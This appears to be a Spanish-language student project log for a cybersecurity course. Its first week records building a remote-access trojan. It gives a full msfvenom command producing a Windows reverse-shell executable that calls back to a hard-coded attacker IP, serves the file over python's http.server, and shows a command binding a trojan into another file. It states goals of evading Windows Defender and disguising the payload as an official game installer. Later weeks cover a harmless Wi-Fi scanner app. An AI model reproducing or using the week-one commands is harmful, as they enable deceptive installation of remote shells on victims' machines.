# Bitacora del proyecto.

## Pequeño aviso previo <br>

La verdad esta bitacora es jalando a memoria, pero en si son las actualizaciones de mi "investigacion"
<br>
por ello me he<br> 
encomendado <br>
reportar<br>
donde he hecho mis investigaciones<br>
o siacaso<br>
novedades
<br>
Cabe aclarar que he revisionado y consultado IA para esto y no me siento orgulloso pero aun asi soy bueno en analisis de datos y por ello dedique una buena hora a revisionar redundancias y en si limpiar el codigo.<br>
Personalemte me dedicare a aprender para yo mismo hacer el codigo y solo usar a mi consultor para limpaido de errores.
<hr>

## Bitacora-Proyecto ciberseguridad
### Consepto_
 	<i>aun que aun no lo tengo definido mi idea es que cree carpetas de maera autónoma en la computadora de la victima, o por lo menos 	dejar que uno la manipule manualmente.</i>
<hr>

### Semana-1_

#### Dia-1_

aprendí el como se puede hacer un spyware o una madre que ocntrola la pc a distancia desde ubuntu (kali Linux originalmente) para poder modificar los archivos de una pc ajena. además de aprender algunos comandos nuevos, entre estos es el ifconfig para ver los datos de la consola, mkdir para crear carpetas, y un nuevo comando que usare llamado msfvenom que es de un tipo de directorio externo
además de esto por medio de cmd ya se como unificar archivos en uno solo, algo como un txt dentro de una imagen con este comando,
    
    copy /d [archivo.formato] + [troyano o otro virus.formato] [nombre.formato]

con esto se crea el archivo convinado, pero creo que falt que el archivo haga algo por medio de comandos, luego veo eso
<br>
Por ultimo el comando que uso para iniciar el ubuntu fue  msfvenom 

    -p windows/x64/shell_reverse_tcp LHOST=172.27.95.107 LPORT=443 -f exe -o virus.exe y el otro es sudo python3 -m http.server 80 (esto por que ubuntu usa python3).

#### Dia-2_
después de indagar por un momento y arreglar algunos asuntos encontré 3 problemas a solucionar_
    <ol>
 	    <li>Que pase windows defender sin alertarlo</li>
 	    <li>que cree un archivo en el dispositivo sin necesidad del administrados</li>
 	    <li>Que sea mas aitomatizado y que no tenga que manipular todo desde cmd, o a lo mucho ejecutar un proceso automatizado</li>
    </ol>

Después de indagarlo el proyecto esta casi listo, puedo manipular archivos por medio de consola cmd y en si el archivo esta oculto en un juego para dicimularlo, cin el plis de camuflarlo como una instalación "oficial" del juego.
#### Dia-3_
todavía no se me ocurren métodos mas que los que estuve investigando, pueto que aun que son complicados son mas simples, confomre a los días estaré intentando actualizar esta bitácora.
<hr>

### Semana-2_
#### Dia-1_
Después de que me cambiaran el proyecto actualmente estoy desarrollando una app destinada para celular que corre con python, con ello busco que la app detecte cosas como la seguridad de la contraseña, las redes disponibles, si tiene contraseña o no, si la red es segura para conectarse en el caso de que sea publica y lo mas importante es que identifique la potencia recibida de la misma, hasta haora solo muestra el SSID la señal y el tipo de seguridad, pero pronto y después de verlo con el maestro vere como puedo optimizarla para que reinicie el detector de redes por si solo y que muestre mas información y las clasifique.
#### Dia-2_
Ya empeze a entender como funciona, y aun que la verdad tuve problemas con ayuda de la IA los anduve resolviendo, lo mas problemático es e¿l tema de la actualización de redes pero ya tabajare en ello
#### Dia-3_
ya tengo algo funcional pero todavía no es suficiente, no clasifica las redes, trabajare en ello
<hr>

### Semana-3
#### Dia-1_
Dejo de funcionar, estoy intentando arreglarlo pero no me da el tiempo, intentare dedicarle mas y ver el progreso
#### Dia-2_
Ya vi el problema, escanner.py no estaba funcionando correctamente, ya solo es arreglar eso y ver como van las cosas
#### Dia-3_
lo logre, se ve bien y ya es funcional, después de que no funcionara otra vez por lo del escanner.py ya lo resolvi. Lo subiré a GitHub con el [readme.md](https://github.com/Had3rm3sGit/RedClassAnalizer/blob/main/README.md)
<hr>

### Semana-4
#### Dia-1_
Ok todo fallo otra vez, la verdad estoy cansado, mi metodo de escanner no funciona de manera correcta y haora ya no quiere jalar, intentare actualizarlo

#### Dia-2_
La verdad todo esta saliendo mas que bien, me agrada el nuevo metodo, despues de consultar a mi maestro me dijo que solo falta el diseño asi qeu trabajare en ello

#### Dia-3_
Despues de ver que mis librerias no funcionan, decidi usar una de base de python llamada [tinker](https://docs.python.org/es/3/library/tkinter.html) y mi diseño aun que basico esta bien, cambiare los colores y le creare mas cositas para que mejore todo

#### Dia-4_
ok otra vez fallo todo pero almenos el maestro me dijo que el diseño esta chido y me dijo que mejor jenere un excel del reporte enves de .txt, vere que opciones tengo.

#### Dia-5_
Ok al final vi que la unica opcion es [openpyxl](https://pypi-org.translate.goog/project/openpyxl/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc) y [pathlib](https://docs.python.org/3/library/pathlib.html) para hacer eso, fuera de eso el resto son internas. asi que lo hare, ya mejore el GUI para que sea mas dinamico con una mejor barra de carga que la que ya tenia y que muestra un preview de el reporte en una caja abajo de la tabla de redes en texto plano, pero el refresh del adaptador todavia no sirve, vere como arreglarlo.

### Semana-5
#### Dia-1_
Ok despues de tomarme el fin de semana opte por un metodo anterior que no me parecio, uno que abre el adaptdor del dispositivo visualmente y lo reinicia para que se puedan ver las redes, ya funciona y todo solo me falta eliminar edundancias.

#### Dia-2_

YA, ya acabe, elimine redundancias, aun que no me sienta orgulloso parte del codigo pedi ayuda para documentar y haora lo unico que no es usado que queda es [Network info.py]() pero ya, ya acabe, haora oslo acabo esta bitacora y hago la revision final.

# ¡AVISO!- La bitácora solo tomara en cuenta tiempo de desarrollo e investigación con algún asunto que 	interfiera que sea externo a ello.